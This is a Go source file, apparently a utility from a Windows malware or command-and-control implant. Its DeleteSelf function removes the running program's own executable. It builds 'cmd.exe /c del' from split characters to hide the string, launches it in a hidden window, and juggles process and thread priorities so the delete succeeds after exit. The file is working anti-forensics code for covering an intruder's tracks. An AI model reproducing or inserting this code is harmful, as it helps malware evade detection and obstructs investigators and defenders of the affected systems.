package utils

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"syscall"
)

var (
	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
	SetThreadPriority = kernel32.NewProc("SetThreadPriority")
)

func DeleteSelf() ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	sI.ShowWindow = windows.SW_HIDE

	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	program, _ := syscall.UTF16PtrFromString("c" + "m" + "d" + "." + "e" + "x" + "e" + " /c" + " d" + "e" + "l " + filename)
	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return nil, errors.New("could not delete " + filename + " " + err.Error())
	}
	err = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, err
	}
	thread, err := windows.GetCurrentThread()
	if err != nil {
		return nil, err
	}
	err = windows.SetPriorityClass(process, windows.REALTIME_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	THREAD_PRIORITY_TIME_CRITICAL := 15
	_, _, err = SetThreadPriority.Call(uintptr(thread), uintptr(THREAD_PRIORITY_TIME_CRITICAL))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}
	fmt.Println("[Log] Success DeleteSelf.")
	return []byte("success delete"), nil

}
